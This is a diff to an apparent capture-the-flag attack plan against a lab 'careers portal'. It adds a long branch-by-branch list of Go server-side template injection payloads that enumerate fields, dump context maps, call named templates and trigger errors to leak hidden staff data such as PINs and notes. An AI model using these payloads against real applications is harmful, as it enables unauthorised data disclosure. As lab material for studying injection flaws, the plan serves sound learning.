@@ -1,7 +1,3 @@
-# angler_fish
-time to get it
-
-
 # Griffin Corp Careers Portal — Attack Plan
 
 **Target:** `ssh -p 2223 anyname@192.168.11.224`
@@ -113,6 +109,105 @@ For every attempt:
 3. Write one line in your notes: `INPUT -> OUTPUT (short)`.
 
 This matters because the challenge says the nonce doesn't expire — you can take your time, but you also won't easily remember which of 20 near-identical attempts did what. Keep a running numbered log (e.g. `001: {{.}} -> no posting match`) so you can diff behavior across attempts.
+
+---
+
+## 5.5. Master list — every input to try, by branch
+
+Work top to bottom. Stop a branch as soon as it errors or clearly fails; move to the next. Log every result as `INPUT -> OUTPUT`.
+
+### Branch A — Confirm the engine is live
+```
+{{.}}
+{{.Role}}
+{{printf "%v" .}}
+```
+
+### Branch B — Enumerate top-level fields (guessing names)
+```
+{{.Role}}
+{{.User}}
+{{.Username}}
+{{.Name}}
+{{.Nonce}}
+{{.Session}}
+{{.SessionID}}
+{{.Context}}
+{{.IsStaff}}
+{{.Staff}}
+{{.Admin}}
+{{.IsAdmin}}
+{{.Permissions}}
+{{.Access}}
+{{.Level}}
+{{.Clearance}}
+{{.Pin}}
+{{.PIN}}
+{{.BadgePin}}
+{{.Badge}}
+{{.Note}}
+{{.Notes}}
+{{.StaffNote}}
+{{.OnboardingNote}}
+{{.Onboarding}}
+{{.Postings}}
+{{.Jobs}}
+{{.Listings}}
+```
+
+### Branch C — Control flow on confirmed fields (once `.Role` is confirmed)
+```
+{{if eq .Role "guest"}}GUEST{{else}}OTHER{{end}}
+{{if eq .Role "staff"}}YES{{else}}NO{{end}}
+{{with .Role}}{{.}}{{end}}
+{{with .Staff}}{{.}}{{end}}
+{{with .Note}}{{.}}{{end}}
+```
+
+### Branch D — Range over collections (dump everything inside a slice/map)
+```
+{{range .}}{{.}}{{end}}
+{{range .Postings}}{{.}}{{end}}
+{{range .Postings}}{{.Title}} - {{.Body}}{{end}}
+{{range $k, $v := .}}{{$k}}: {{$v}}{{end}}
+```
+The `$k, $v` form is useful if the context is a map — it prints key names you didn't have to guess.
+
+### Branch E — Named template invocation (escalation if multiple templates exist)
+```
+{{template "staff" .}}
+{{template "admin" .}}
+{{template "note" .}}
+{{template "onboarding" .}}
+{{template "onboarding-note" .}}
+```
+
+### Branch F — Nested field access (if `.Context` or similar is a struct, not a string)
+```
+{{.Context.Role}}
+{{.Context.Staff}}
+{{.Session.Role}}
+{{.Session.Nonce}}
+{{.User.Role}}
+{{.User.Staff}}
+```
+
+### Branch G — Deliberate errors to leak type/field info
+```
+{{.Foo.Bar}}
+{{.Zzz}}
+{{.Role.Zzz}}
+```
+Read whatever error text comes back carefully — Go template errors often include the real type name or a list of valid field names.
+
+### Branch H — Function calls (only if Branch A showed `printf` working)
+```
+{{printf "%+v" .}}
+{{printf "%#v" .}}
+{{len .}}
+{{len .Postings}}
+```
+`%+v` and `%#v` print field names alongside values — much more useful than `%v` alone if the engine allows it.
 
 ---
 
